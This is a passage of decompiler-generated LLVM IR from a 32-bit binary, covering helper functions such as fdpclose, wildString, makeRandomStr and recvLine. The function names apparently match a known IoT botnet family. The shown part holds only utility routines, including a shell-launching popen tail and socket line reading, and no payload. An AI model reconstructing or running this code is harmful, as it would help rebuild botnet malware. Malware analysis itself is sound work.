dec_label_pc_9014:                                ; preds = %dec_label_pc_8fcc
  %v3_9014 = load i32, i32* %stack_var_-32, align 4
  %v2_9018 = icmp eq i32 %v3_9014, 0
  br i1 %v2_9018, label %dec_label_pc_903c, label %dec_label_pc_9020

dec_label_pc_9020:                                ; preds = %dec_label_pc_9014
  %v4_902c = call i32 @dup2(i32 %v3_9014, i32 0, i32 %tmp)
  %v3_9030 = load i32, i32* %stack_var_-32, align 4
  %v1_9038 = call i32 @__GI_close(i32 %v3_9030)
  br label %dec_label_pc_903c

dec_label_pc_903c:                                ; preds = %dec_label_pc_9014, %dec_label_pc_9020
  %v1_9044 = call i32 @__GI_close(i32 %tmp3)
  br label %dec_label_pc_9048

dec_label_pc_9048:                                ; preds = %dec_label_pc_9004, %dec_label_pc_903c
  %v8_9060 = call i32 @execl(i32 ptrtoint ([8 x i8]* @global_var_1bbf4.35 to i32), i32 ptrtoint ([3 x i8]* @global_var_1bbfc.37 to i32), i32 ptrtoint ([3 x i8]* @global_var_1bc00.39 to i32), i32 %arg1, i32 0)
  %v1_9068 = call i32 @__GI__exit(i32 127)
  br label %dec_label_pc_906c

dec_label_pc_906c:                                ; preds = %dec_label_pc_8f98, %dec_label_pc_9048
  %v2_9070 = load i8, i8* %arg2, align 1
  %v7_9074 = icmp eq i8 %v2_9070, 114
  br i1 %v7_9074, label %dec_label_pc_907c, label %dec_label_pc_9094

dec_label_pc_907c:                                ; preds = %dec_label_pc_906c
  %v3_907c = load i32, i32* %stack_var_-32, align 4
  %v1_908c = call i32 @__GI_close(i32 %tmp3)
  br label %dec_label_pc_90a8

dec_label_pc_9094:                                ; preds = %dec_label_pc_906c
  %v3_909c = load i32, i32* %stack_var_-32, align 4
  %v1_90a4 = call i32 @__GI_close(i32 %v3_909c)
  br label %dec_label_pc_90a8

dec_label_pc_90a8:                                ; preds = %dec_label_pc_907c, %dec_label_pc_9094
  %stack_var_-40.0 = phi i32 [ %v3_907c, %dec_label_pc_907c ], [ %tmp3, %dec_label_pc_9094 ]
  %v3_90ac = mul i32 %stack_var_-40.0, 4
  %v2_90b8 = load i32, i32* @global_var_2a4b8.33, align 4
  %v2_90bc = add i32 %v2_90b8, %v3_90ac
  %v2_90c4 = inttoptr i32 %v2_90bc to i32*
  store i32 %v0_8f78, i32* %v2_90c4, align 4
  br label %dec_label_pc_90d0

dec_label_pc_90d0:                                ; preds = %dec_label_pc_8fa8, %dec_label_pc_8f4c, %dec_label_pc_8f10, %dec_label_pc_8edc, %dec_label_pc_8eb8, %dec_label_pc_90a8
  %stack_var_-44.0 = phi i32 [ -1, %dec_label_pc_8edc ], [ -1, %dec_label_pc_8f4c ], [ -1, %dec_label_pc_8fa8 ], [ %stack_var_-40.0, %dec_label_pc_90a8 ], [ -1, %dec_label_pc_8f10 ], [ -1, %dec_label_pc_8eb8 ]
  store i32 %v3_8e70, i32* @fp, align 4
  ret i32 %stack_var_-44.0

; uselistorder directives
  uselistorder i32 %stack_var_-40.0, { 1, 0 }
  uselistorder i32 %v0_8f78, { 1, 2, 0 }
  uselistorder i32 %v3_8f20, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %tmp3, { 0, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 (i32, i32, i32)* @dup2, { 1, 0 }
  uselistorder i8* %arg2, { 1, 2, 0, 3, 4 }
  uselistorder label %dec_label_pc_90d0, { 5, 0, 1, 2, 3, 4 }
  uselistorder label %dec_label_pc_90a8, { 1, 0 }
  uselistorder label %dec_label_pc_906c, { 1, 0 }
  uselistorder label %dec_label_pc_9048, { 1, 0 }
  uselistorder label %dec_label_pc_903c, { 1, 0 }
  uselistorder label %dec_label_pc_9004, { 1, 0 }
  uselistorder label %dec_label_pc_8f78, { 1, 0 }
  uselistorder label %dec_label_pc_8eb8, { 1, 0 }
}

define i32 @fdpclose(i32 %arg1) local_unnamed_addr {
entry:
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v2_910c = load i32, i32* @global_var_2a4b8.33, align 4
  %v2_9110 = icmp eq i32 %v2_910c, 0
  br i1 %v2_9110, label %dec_label_pc_9264, label %dec_label_pc_9118

dec_label_pc_9118:                                ; preds = %entry
  %v3_911c = mul i32 %arg1, 4
  %v2_912c = add i32 %v2_910c, %v3_911c
  %v1_9130 = inttoptr i32 %v2_912c to i32*
  %v2_9130 = load i32, i32* %v1_9130, align 4
  %v2_9134 = icmp eq i32 %v2_9130, 0
  br i1 %v2_9134, label %dec_label_pc_9264, label %dec_label_pc_9148

dec_label_pc_9148:                                ; preds = %dec_label_pc_9118
  %v1_914c = call i32 @__GI_close(i32 %arg1)
  %v2_9150 = ptrtoint i32* %stack_var_-36 to i32
  %v2_9158 = call i32 @sigemptyset(i32* nonnull %stack_var_-36)
  store i32 %v2_9150, i32* @r0, align 4
  %v2_9168 = call i32 @__GI_sigaddset(i32 %v2_9150, i32 2)
  store i32 %v2_9150, i32* @r0, align 4
  %v2_9178 = call i32 @__GI_sigaddset(i32 %v2_9150, i32 3)
  store i32 %v2_9150, i32* @r0, align 4
  %v2_9188 = call i32 @__GI_sigaddset(i32 %v2_9150, i32 1)
  %v2_9190 = ptrtoint i32* %stack_var_-28 to i32
  %v4_919c = call i32 @__GI_sigprocmask(i32 0, i32 %v2_9150, i32 %v2_9190, i32 %v2_9150)
  %v2_91bc = ptrtoint i32* %stack_var_-40 to i32
  br label %dec_label_pc_91a0

dec_label_pc_91a0:                                ; preds = %dec_label_pc_91e4, %dec_label_pc_9148
  %v2_91b0 = load i32, i32* @global_var_2a4b8.33, align 4
  %v2_91b4 = add i32 %v2_91b0, %v3_911c
  %v1_91b8 = inttoptr i32 %v2_91b4 to i32*
  %v2_91b8 = load i32, i32* %v1_91b8, align 4
  store i32 %v2_91b8, i32* @r0, align 4
  %v3_91cc = call i32 @__libc_waitpid(i32 %v2_91b8, i32 %v2_91bc, i32 0)
  %v3_91dc = icmp eq i32 %v3_91cc, -1
  %v8_91dc = icmp eq i32 %v3_91cc, -1
  br i1 %v3_91dc, label %dec_label_pc_91e4, label %dec_label_pc_91f8

dec_label_pc_91e4:                                ; preds = %dec_label_pc_91a0
  %v0_91e4 = call i32 @__GI___errno_location()
  %v1_91ec = inttoptr i32 %v0_91e4 to i32*
  %v2_91ec = load i32, i32* %v1_91ec, align 4
  %v7_91f0 = icmp eq i32 %v2_91ec, 4
  br i1 %v7_91f0, label %dec_label_pc_91a0, label %dec_label_pc_91f8

dec_label_pc_91f8:                                ; preds = %dec_label_pc_91a0, %dec_label_pc_91e4
  %v4_9208 = call i32 @__GI_sigprocmask(i32 2, i32 %v2_9190, i32 0, i32 %v2_9190)
  %v3_9210 = mul i32 %tmp6, 4
  %v2_921c = load i32, i32* @global_var_2a4b8.33, align 4
  %v2_9220 = add i32 %v2_921c, %v3_9210
  %v2_9228 = inttoptr i32 %v2_9220 to i32*
  store i32 0, i32* %v2_9228, align 4
  br i1 %v8_91dc, label %dec_label_pc_9264, label %dec_label_pc_9238

dec_label_pc_9238:                                ; preds = %dec_label_pc_91f8
  %v3_9238 = load i32, i32* %stack_var_-40, align 4
  %v1_9244 = and i32 %v3_9238, 65280
  %v3_92481 = udiv i32 %v1_9244, 256
  br label %dec_label_pc_9264

dec_label_pc_9264:                                ; preds = %dec_label_pc_9238, %dec_label_pc_91f8, %entry, %dec_label_pc_9118
  %storemerge = phi i32 [ -1, %dec_label_pc_9118 ], [ -1, %entry ], [ %v3_92481, %dec_label_pc_9238 ], [ -1, %dec_label_pc_91f8 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v2_9190, { 1, 0, 2 }
  uselistorder i32 %v2_9150, { 0, 1, 3, 2, 5, 4, 7, 6 }
  uselistorder i32 %v3_911c, { 1, 0 }
  uselistorder i32 (i32, i32)* @__GI_sigaddset, { 2, 1, 0 }
  uselistorder i32* @global_var_2a4b8.33, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_9264, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_91f8, { 1, 0 }
}

define i32 @fdgets(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  br label %dec_label_pc_92ec

dec_label_pc_92ac:                                ; preds = %dec_label_pc_92fc
  %v1_92c8 = call i32 @__GI_read(i32 %arg3)
  %v1_92d8 = add nuw i32 %storemerge25, 1
  %v7_92e4 = icmp eq i32 %v1_92c8, 1
  br i1 %v7_92e4, label %dec_label_pc_92ec, label %dec_label_pc_931c

dec_label_pc_92ec:                                ; preds = %entry, %dec_label_pc_92ac
  %storemerge25 = phi i32 [ 0, %entry ], [ %v1_92d8, %dec_label_pc_92ac ]
  %v6_92f8 = icmp slt i32 %storemerge25, %arg2
  br i1 %v6_92f8, label %dec_label_pc_92fc, label %dec_label_pc_931c

dec_label_pc_92fc:                                ; preds = %dec_label_pc_92ec
  %v2_9308 = add i32 %storemerge25, %arg1
  %v1_930c = add i32 %v2_9308, -1
  %v1_9310 = inttoptr i32 %v1_930c to i8*
  %v2_9310 = load i8, i8* %v1_9310, align 1
  %v7_9314 = icmp eq i8 %v2_9310, 10
  br i1 %v7_9314, label %dec_label_pc_931c, label %dec_label_pc_92ac

dec_label_pc_931c:                                ; preds = %dec_label_pc_92fc, %dec_label_pc_92ec, %dec_label_pc_92ac
  %stack_var_-24.0.lcssa = phi i32 [ 1, %dec_label_pc_92fc ], [ 1, %dec_label_pc_92ec ], [ %v1_92c8, %dec_label_pc_92ac ]
  %v2_9320 = icmp eq i32 %stack_var_-24.0.lcssa, 0
  %storemerge3 = select i1 %v2_9320, i32 0, i32 %arg1
  ret i32 %storemerge3

; uselistorder directives
  uselistorder i32 %v1_92c8, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_92ec, { 1, 0 }
}

define i32 @parseHex(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v2_93a42 = load i8, i8* %arg1, align 1
  %v2_93a84 = icmp eq i8 %v2_93a42, 0
  br i1 %v2_93a84, label %dec_label_pc_93bc, label %dec_label_pc_93b0

dec_label_pc_9370:                                ; preds = %dec_label_pc_93b0
  %v3_9374 = mul i32 %stack_var_-20.06, 16
  %v2_937c = load i8, i8* %stack_var_-28.05, align 1
  %v3_937c = zext i8 %v2_937c to i32
  %v4_9388 = mul nuw nsw i32 %v3_937c, 4
  %v5_9388 = add i32 %v4_9388, ptrtoint (i32* @global_var_1bc04.42 to i32)
  %v6_9388 = inttoptr i32 %v5_9388 to i32*
  %v7_9388 = load i32, i32* %v6_9388, align 4
  %v2_938c = or i32 %v7_9388, %v3_9374
  %v1_9398 = add i32 %v4_93a07, 1
  %v5_939c = inttoptr i32 %v1_9398 to i8*
  %v2_93a4 = load i8, i8* %v5_939c, align 1
  %v2_93a8 = icmp eq i8 %v2_93a4, 0
  br i1 %v2_93a8, label %dec_label_pc_93bc, label %dec_label_pc_93b0

dec_label_pc_93b0:                                ; preds = %entry, %dec_label_pc_9370
  %v4_93a07 = phi i32 [ %v1_9398, %dec_label_pc_9370 ], [ %tmp, %entry ]
  %stack_var_-20.06 = phi i32 [ %v2_938c, %dec_label_pc_9370 ], [ 0, %entry ]
  %stack_var_-28.05 = phi i8* [ %v5_939c, %dec_label_pc_9370 ], [ %arg1, %entry ]
  %v1_93b4 = icmp slt i32 %stack_var_-20.06, 0
  br i1 %v1_93b4, label %dec_label_pc_93bc, label %dec_label_pc_9370

dec_label_pc_93bc:                                ; preds = %dec_label_pc_9370, %dec_label_pc_93b0, %entry
  %stack_var_-20.0.lcssa = phi i32 [ 0, %entry ], [ %v2_938c, %dec_label_pc_9370 ], [ %stack_var_-20.06, %dec_label_pc_93b0 ]
  ret i32 %stack_var_-20.0.lcssa

; uselistorder directives
  uselistorder i32 %stack_var_-20.06, { 1, 2, 0 }
  uselistorder label %dec_label_pc_93bc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_93b0, { 1, 0 }
}

define i32 @wildString(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = inttoptr i32 %arg2 to i8*
  %tmp8 = ptrtoint i8* %arg1 to i32
  %stack_var_-4 = alloca i32, align 4
  %v3_93d8 = load i32, i32* @r4, align 4
  %v6_93d8 = load i32, i32* @fp, align 4
  store i32 37856, i32* %stack_var_-4, align 4
  %v2_93dc = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_93dc, i32* @fp, align 4
  %v2_93f0 = load i8, i8* %arg1, align 1
  %v7_93fc = icmp eq i8 %v2_93f0, 42
  br i1 %v7_93fc, label %dec_label_pc_9430, label %dec_label_pc_9404

dec_label_pc_9404:                                ; preds = %entry
  %v7_9408 = icmp eq i8 %v2_93f0, 63
  br i1 %v7_9408, label %dec_label_pc_94a0, label %dec_label_pc_9410

dec_label_pc_9410:                                ; preds = %dec_label_pc_9404
  %v2_9414 = icmp eq i8 %v2_93f0, 0
  br i1 %v2_9414, label %dec_label_pc_9420, label %dec_label_pc_94f8

dec_label_pc_9420:                                ; preds = %dec_label_pc_9410
  %v2_9424 = load i8, i8* %tmp, align 1
  %v3_9424 = zext i8 %v2_9424 to i32
  br label %dec_label_pc_956c

dec_label_pc_9430:                                ; preds = %entry
  %v1_9434 = add i32 %tmp8, 1
  %v3_9440 = inttoptr i32 %v1_9434 to i8*
  %v4_9440 = call i32 @wildString(i8* %v3_9440, i32 %arg2)
  %v2_9448 = icmp eq i32 %v4_9440, 0
  br i1 %v2_9448, label %dec_label_pc_948c, label %dec_label_pc_9450

dec_label_pc_9450:                                ; preds = %dec_label_pc_9430
  %v2_9454 = load i8, i8* %tmp, align 1
  %v2_9458 = icmp eq i8 %v2_9454, 0
  br i1 %v2_9458, label %dec_label_pc_9494, label %dec_label_pc_9460

dec_label_pc_9460:                                ; preds = %dec_label_pc_9450
  %v1_9464 = add i32 %arg2, 1
  %v4_9470 = call i32 @wildString(i8* nonnull %arg1, i32 %v1_9464)
  %v2_9478 = icmp eq i32 %v4_9470, 0
  br i1 %v2_9478, label %dec_label_pc_948c, label %dec_label_pc_9494

dec_label_pc_948c:                                ; preds = %dec_label_pc_9460, %dec_label_pc_9430
  br label %dec_label_pc_9494

dec_label_pc_9494:                                ; preds = %dec_label_pc_9450, %dec_label_pc_9460, %dec_label_pc_948c
  %storemerge3 = phi i32 [ 0, %dec_label_pc_948c ], [ 1, %dec_label_pc_9460 ], [ 1, %dec_label_pc_9450 ]
  br label %dec_label_pc_956c

dec_label_pc_94a0:                                ; preds = %dec_label_pc_9404
  %v2_94a4 = load i8, i8* %tmp, align 1
  %v2_94a8 = icmp eq i8 %v2_94a4, 0
  br i1 %v2_94a8, label %dec_label_pc_94ec, label %dec_label_pc_94b0

dec_label_pc_94b0:                                ; preds = %dec_label_pc_94a0
  %v1_94b4 = add i32 %tmp8, 1
  %v1_94bc = add i32 %arg2, 1
  %v2_94c8 = inttoptr i32 %v1_94b4 to i8*
  %v3_94c8 = call i32 @wildString(i8* %v2_94c8, i32 %v1_94bc)
  %v2_94d0 = icmp ne i32 %v3_94c8, 0
  %. = zext i1 %v2_94d0 to i32
  br label %dec_label_pc_94ec

dec_label_pc_94ec:                                ; preds = %dec_label_pc_94b0, %dec_label_pc_94a0
  %storemerge2 = phi i32 [ 1, %dec_label_pc_94a0 ], [ %., %dec_label_pc_94b0 ]
  br label %dec_label_pc_956c

dec_label_pc_94f8:                                ; preds = %dec_label_pc_9410
  %v2_94fc = load i8, i8* %arg1, align 1
  %v3_94fc = zext i8 %v2_94fc to i32
  %v1_9504 = call i32 @__GI_toupper(i32 %v3_94fc)
  store i32 %v1_9504, i32* @r4, align 4
  %v2_9510 = load i8, i8* %tmp, align 1
  %v3_9510 = zext i8 %v2_9510 to i32
  %v1_9518 = call i32 @__GI_toupper(i32 %v3_9510)
  %v0_9520 = load i32, i32* @r4, align 4
  %v9_9520 = icmp eq i32 %v0_9520, %v1_9518
  br i1 %v9_9520, label %dec_label_pc_9528, label %dec_label_pc_9564

dec_label_pc_9528:                                ; preds = %dec_label_pc_94f8
  %v1_952c = add i32 %tmp8, 1
  %v1_9534 = add i32 %arg2, 1
  %v2_9540 = inttoptr i32 %v1_952c to i8*
  %v3_9540 = call i32 @wildString(i8* %v2_9540, i32 %v1_9534)
  %v2_9548 = icmp ne i32 %v3_9540, 0
  %.7 = zext i1 %v2_9548 to i32
  br label %dec_label_pc_9564

dec_label_pc_9564:                                ; preds = %dec_label_pc_9528, %dec_label_pc_94f8
  %storemerge = phi i32 [ 1, %dec_label_pc_94f8 ], [ %.7, %dec_label_pc_9528 ]
  br label %dec_label_pc_956c

dec_label_pc_956c:                                ; preds = %dec_label_pc_94ec, %dec_label_pc_9494, %dec_label_pc_9420, %dec_label_pc_9564
  %stack_var_-48.0 = phi i32 [ %storemerge3, %dec_label_pc_9494 ], [ %storemerge2, %dec_label_pc_94ec ], [ %v3_9424, %dec_label_pc_9420 ], [ %storemerge, %dec_label_pc_9564 ]
  store i32 %v3_93d8, i32* @r4, align 4
  store i32 %v6_93d8, i32* @fp, align 4
  ret i32 %stack_var_-48.0

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i8* %tmp, { 0, 2, 3, 1 }
  uselistorder i32 %arg2, { 3, 2, 0, 1, 4 }
  uselistorder label %dec_label_pc_956c, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_9494, { 2, 1, 0 }
}

define i32 @getHost(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v1_95a0 = call i32 @inet_addr(i32 %arg1)
  store i32 %v1_95a0, i32* %arg2, align 4
  %v3_95b8 = icmp eq i32 %v1_95a0, -1
  %. = zext i1 %v3_95b8 to i32
  ret i32 %.

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @uppercase(i8* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v0_95f8 = load i32, i32* %r0.global-to-local, align 4
  %storemerge2 = inttoptr i32 %v0_95f8 to i8*
  %v2_96303 = load i8, i8* %storemerge2, align 1
  %v2_96345 = icmp eq i8 %v2_96303, 0
  br i1 %v2_96345, label %dec_label_pc_963c, label %dec_label_pc_9600

dec_label_pc_9600:                                ; preds = %entry, %dec_label_pc_9600
  %storemerge7 = phi i8* [ %storemerge, %dec_label_pc_9600 ], [ %storemerge2, %entry ]
  %storemerge.in6 = phi i32 [ %v1_9624, %dec_label_pc_9600 ], [ %v0_95f8, %entry ]
  %v2_9604 = load i8, i8* %storemerge7, align 1
  %v3_9604 = zext i8 %v2_9604 to i32
  store i32 %v3_9604, i32* %r0.global-to-local, align 4
  %v1_960c = call i32 @__GI_toupper(i32 %v3_9604)
  store i32 %v1_960c, i32* %r0.global-to-local, align 4
  %v1_961c = trunc i32 %v1_960c to i8
  store i8 %v1_961c, i8* %storemerge7, align 1
  %v1_9624 = add i32 %storemerge.in6, 1
  %storemerge = inttoptr i32 %v1_9624 to i8*
  %v2_9630 = load i8, i8* %storemerge, align 1
  %v2_9634 = icmp eq i8 %v2_9630, 0
  br i1 %v2_9634, label %dec_label_pc_962c.dec_label_pc_963c_crit_edge, label %dec_label_pc_9600

dec_label_pc_962c.dec_label_pc_963c_crit_edge:    ; preds = %dec_label_pc_9600
  %v1_9644.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_963c

dec_label_pc_963c:                                ; preds = %dec_label_pc_962c.dec_label_pc_963c_crit_edge, %entry
  %v1_9644 = phi i32 [ %v1_9644.pre, %dec_label_pc_962c.dec_label_pc_963c_crit_edge ], [ %v0_95f8, %entry ]
  ret i32 %v1_9644

; uselistorder directives
  uselistorder i8* %storemerge, { 1, 0 }
  uselistorder i32 %v1_9624, { 1, 0 }
  uselistorder i8* %storemerge7, { 1, 0 }
  uselistorder i32 %v0_95f8, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 3, 4, 2, 0, 1 }
  uselistorder label %dec_label_pc_9600, { 1, 0 }
}

define i32 @makeRandomStr(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v3_964c = load i32, i32* @r4, align 4
  %v6_964c = load i32, i32* @fp, align 4
  %v0_9658 = load i32, i32* %r0.global-to-local, align 4
  %v5_96ec24 = icmp sgt i32 %arg2, 0
  br i1 %v5_96ec24, label %dec_label_pc_9674, label %dec_label_pc_96f0

dec_label_pc_9674:                                ; preds = %entry, %dec_label_pc_9674
  %storemerge725 = phi i32 [ %v1_96d8, %dec_label_pc_9674 ], [ 0, %entry ]
  %v2_9680 = add i32 %storemerge725, %v0_9658
  store i32 %v2_9680, i32* @r4, align 4
  %v0_9684 = call i32 @rand_cmwc()
  store i32 %v0_9684, i32* %r0.global-to-local, align 4
  %v3_9694 = udiv i32 %v0_9684, 26
  %tmp = mul nsw i32 %v3_9694, -2
  %v2_96b8 = add i32 %v0_9684, %tmp
  %fold = add i32 %v2_96b8, 65
  %v1_96d0 = trunc i32 %fold to i8
  %v2_96d0 = load i32, i32* @r4, align 4
  %v3_96d0 = inttoptr i32 %v2_96d0 to i8*
  store i8 %v1_96d0, i8* %v3_96d0, align 1
  %v1_96d8 = add nuw nsw i32 %storemerge725, 1
  %v5_96ec = icmp slt i32 %v1_96d8, %arg2
  br i1 %v5_96ec, label %dec_label_pc_9674, label %dec_label_pc_96e0.dec_label_pc_96f0_crit_edge

dec_label_pc_96e0.dec_label_pc_96f0_crit_edge:    ; preds = %dec_label_pc_9674
  %v1_96f8.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_96f0

dec_label_pc_96f0:                                ; preds = %dec_label_pc_96e0.dec_label_pc_96f0_crit_edge, %entry
  %v1_96f8 = phi i32 [ %v1_96f8.pre, %dec_label_pc_96e0.dec_label_pc_96f0_crit_edge ], [ %v0_9658, %entry ]
  store i32 %v3_964c, i32* @r4, align 4
  store i32 %v6_964c, i32* @fp, align 4
  ret i32 %v1_96f8

; uselistorder directives
  uselistorder i32 %v1_96d8, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 0, 1 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_9674, { 1, 0 }
}

define i32 @recvLine(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_9754.lr.ph:
  %tmp33 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-185 = alloca i8, align 1
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_9704 = load i32, i32* @fp, align 4
  store i32 %v3_9704, i32* %stack_var_-16, align 4
  store i32 %arg3, i32* @r2, align 4
  %v4_972c = call i32 @__GI_memset(i8* %arg2, i32 0)
  store i32 30, i32* %stack_var_-184, align 4
  %v2_9740 = ptrtoint i32* %stack_var_-176 to i32
  br label %dec_label_pc_9754

dec_label_pc_9754:                                ; preds = %dec_label_pc_9754.lr.ph, %dec_label_pc_9754
  %storemerge527 = phi i32 [ 0, %dec_label_pc_9754.lr.ph ], [ %v1_9768, %dec_label_pc_9754 ]
  %v5_9760 = mul nuw nsw i32 %storemerge527, 4
  %v6_9760 = add i32 %v5_9760, %v2_9740
  %v7_9760 = inttoptr i32 %v6_9760 to i32*
  store i32 0, i32* %v7_9760, align 4
  %v1_9768 = add nuw nsw i32 %storemerge527, 1
  %tmp52 = icmp ult i32 %v1_9768, 32
  br i1 %tmp52, label %dec_label_pc_9754, label %dec_label_pc_977c

dec_label_pc_977c:                                ; preds = %dec_label_pc_9754
  %v13_9704 = ptrtoint i32* %stack_var_-16 to i32
  %v3_9780 = udiv i32 %arg1, 32
  %v3_978c = mul nuw nsw i32 %v3_9780, 4
  %v2_9794 = add nsw i32 %v3_978c, -160
  %v2_9798 = add i32 %v2_9794, %v13_9704
  %v1_979c = inttoptr i32 %v2_9798 to i32*
  %v2_979c = load i32, i32* %v1_979c, align 4
  %v1_97a4 = urem i32 %arg1, 32
  %v6_97ac = shl i32 1, %v1_97a4
  %v2_97b0 = or i32 %v2_979c, %v6_97ac
  store i32 %v2_97b0, i32* %v1_979c, align 4
  %v1_97d0 = add i32 %arg1, 1
  %v2_97dc = ptrtoint i32* %stack_var_-184 to i32
  %v5_97f0 = call i32 @__libc_select(i32 %v1_97d0, i32 %v2_9740, i32 0, i32 %v2_9740, i32 %v2_97dc)
  %v5_9804 = icmp sgt i32 %v5_97f0, 0
  br i1 %v5_9804, label %dec_label_pc_9984.preheader, label %dec_label_pc_98f0.preheader

dec_label_pc_98f0.preheader:                      ; preds = %dec_label_pc_977c
  %v7_98f823 = icmp slt i32 %tmp33, 10
  br i1 %v7_98f823, label %dec_label_pc_9830.lr.ph, label %dec_label_pc_9984.preheader

dec_label_pc_9830.lr.ph:                          ; preds = %dec_label_pc_98f0.preheader, %dec_label_pc_98e4
  %stack_var_-44.024 = phi i32 [ %v1_98e8, %dec_label_pc_98e4 ], [ %tmp33, %dec_label_pc_98f0.preheader ]
  store i32 30, i32* %stack_var_-184, align 4
  br label %dec_label_pc_9830

dec_label_pc_9830:                                ; preds = %dec_label_pc_9830.lr.ph, %dec_label_pc_9830
  %storemerge615 = phi i32 [ 0, %dec_label_pc_9830.lr.ph ], [ %v1_9844, %dec_label_pc_9830 ]
  %v5_983c = mul nuw nsw i32 %storemerge615, 4
  %v6_983c = add i32 %v5_983c, %v2_9740
  %v7_983c = inttoptr i32 %v6_983c to i32*
  store i32 0, i32* %v7_983c, align 4
  %v1_9844 = add nuw nsw i32 %storemerge615, 1
  %tmp53 = icmp ult i32 %v1_9844, 32
  br i1 %tmp53, label %dec_label_pc_9830, label %dec_label_pc_9858

dec_label_pc_9858:                                ; preds = %dec_label_pc_9830
  %v2_9878 = load i32, i32* %v1_979c, align 4
  %v2_988c = or i32 %v2_9878, %v6_97ac
  store i32 %v2_988c, i32* %v1_979c, align 4
  %v5_98cc = call i32 @__libc_select(i32 %v1_97d0, i32 %v2_9740, i32 0, i32 %v2_9740, i32 %v2_97dc)
  %v5_98e0 = icmp sgt i32 %v5_98cc, 0
  br i1 %v5_98e0, label %dec_label_pc_9984.preheader, label %dec_label_pc_98e4

dec_label_pc_98e4:                                ; preds = %dec_label_pc_9858
  %v1_98e8 = add nsw i32 %stack_var_-44.024, 1
  %v7_98f8 = icmp slt i32 %v1_98e8, 10
  br i1 %v7_98f8, label %dec_label_pc_9830.lr.ph, label %dec_label_pc_9984.preheader

dec_label_pc_9984.preheader:                      ; preds = %dec_label_pc_98e4, %dec_label_pc_9858, %dec_label_pc_98f0.preheader, %dec_label_pc_977c
  %v2_9918 = ptrtoint i8* %stack_var_-185 to i32
  %not.v7_998c57 = icmp sgt i32 %arg3, 1
  %v2_99a459 = icmp eq i1 %not.v7_998c57, false
  br i1 %v2_99a459, label %dec_label_pc_99ac, label %dec_label_pc_9910

dec_label_pc_9910:                                ; preds = %dec_label_pc_9984.preheader, %dec_label_pc_9978
  %v1_998862.in = phi i32 [ %v1_998862, %dec_label_pc_9978 ], [ %arg3, %dec_label_pc_9984.preheader ]
  %stack_var_-40.061 = phi i8* [ %v5_9968, %dec_label_pc_9978 ], [ %arg2, %dec_label_pc_9984.preheader ]
  %stack_var_-36.060 = phi i32 [ %v1_997c, %dec_label_pc_9978 ], [ 0, %dec_label_pc_9984.preheader ]
  %v1_998862 = add i32 %v1_998862.in, -1
  %v2_9914 = load i32, i32* @global_var_26498.45, align 4
  %v5_992c = call i32 @__libc_recv(i32 %v2_9914, i32 %v2_9918, i32 1, i32 0, i32 %v1_998862)
  %v7_9934 = icmp eq i32 %v5_992c, 1
  br i1 %v7_9934, label %dec_label_pc_9954, label %dec_label_pc_993c

dec_label_pc_993c:                                ; preds = %dec_label_pc_9910
  store i8 0, i8* %stack_var_-40.061, align 1
  br label %dec_label_pc_99c0

dec_label_pc_9954:                                ; preds = %dec_label_pc_9910
  %v3_9954 = load i8, i8* %stack_var_-185, align 1
  %v4_9958 = ptrtoint i8* %stack_var_-40.061 to i32
  store i8 %v3_9954, i8* %stack_var_-40.061, align 1
  %v1_9964 = add i32 %v4_9958, 1
  %v5_9968 = inttoptr i32 %v1_9964 to i8*
  %v3_996c = load i8, i8* %stack_var_-185, align 1
  %v7_9970 = icmp eq i8 %v3_996c, 10
  br i1 %v7_9970, label %dec_label_pc_99ac, label %dec_label_pc_9978

dec_label_pc_9978:                                ; preds = %dec_label_pc_9954
  %v1_997c = add i32 %stack_var_-36.060, 1
  %not.v7_998c = icmp sgt i32 %v1_998862, 1
  %v2_99a4 = icmp eq i1 %not.v7_998c, false
  br i1 %v2_99a4, label %dec_label_pc_99ac, label %dec_label_pc_9910

dec_label_pc_99ac:                                ; preds = %dec_label_pc_9954, %dec_label_pc_9978, %dec_label_pc_9984.preheader
  %stack_var_-36.0.lcssa = phi i32 [ 0, %dec_label_pc_9984.preheader ], [ %v1_997c, %dec_label_pc_9978 ], [ %stack_var_-36.060, %dec_label_pc_9954 ]
  %stack_var_-40.1 = phi i8* [ %arg2, %dec_label_pc_9984.preheader ], [ %v5_9968, %dec_label_pc_9978 ], [ %v5_9968, %dec_label_pc_9954 ]
  store i8 0, i8* %stack_var_-40.1, align 1
